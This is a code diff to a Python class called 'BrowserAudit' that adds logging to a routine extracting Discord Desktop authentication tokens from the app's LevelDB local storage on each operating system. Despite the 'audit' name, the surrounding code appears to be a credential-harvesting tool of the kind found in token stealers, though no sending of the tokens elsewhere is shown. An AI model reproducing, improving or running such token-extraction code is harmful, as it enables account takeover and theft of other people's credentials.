@@ -240,9 +240,11 @@ class BrowserAudit:
             import shutil
             import tempfile
         except ImportError:
+            self.log("ERROR", "plyvel library not available for Discord token extraction")
             return
 
         print(f"{self.COLORS['CYAN']}[*] Extracting Discord Desktop tokens...{self.COLORS['RESET']}")
+        self.log("INFO", "Starting Discord Desktop token extraction")
 
         if self.os_type == 'darwin':
             discord_dirs = {
@@ -260,15 +262,20 @@ class BrowserAudit:
             }
 
         found_any = False
+        checked_count = 0
 
         for app_name, discord_dir in discord_dirs.items():
+            self.log("INFO", f"Checking for {app_name} at {discord_dir}")
+
             if not discord_dir.exists():
+                self.log("INFO", f"{app_name} directory not found")
                 continue
 
+            checked_count += 1
             leveldb_path = discord_dir / "Local Storage/leveldb"
 
             if not leveldb_path.exists():
-                self.log("DEBUG", f"{app_name} LevelDB not found at {leveldb_path}")
+                self.log("INFO", f"{app_name} LevelDB not found at {leveldb_path}")
                 continue
 
             try:
@@ -299,14 +306,20 @@ class BrowserAudit:
                                 pass
 
                     if not keys_found:
-                        self.log("DEBUG", f"{app_name} LevelDB exists but is empty or unreadable")
+                        self.log("INFO", f"{app_name} LevelDB exists but is empty or unreadable")
+                    else:
+                        self.log("INFO", f"{app_name} LevelDB has {len(keys_found)} keys")
 
                     db.close()
             except Exception as e:
-                self.log("DEBUG", f"Discord {app_name} extraction: {e}")
+                self.log("ERROR", f"Discord {app_name} extraction failed: {e}")
+
+        self.log("INFO", f"Discord extraction complete: checked {checked_count} installations, found tokens: {found_any}")
 
         if found_any:
             print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")
+        else:
+            print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (tokens may be encrypted){self.COLORS['RESET']}\n")
 
     def filter_display_content(self, content, filename):
         if 'discord_tokens' in filename or 'discord_web' in filename:
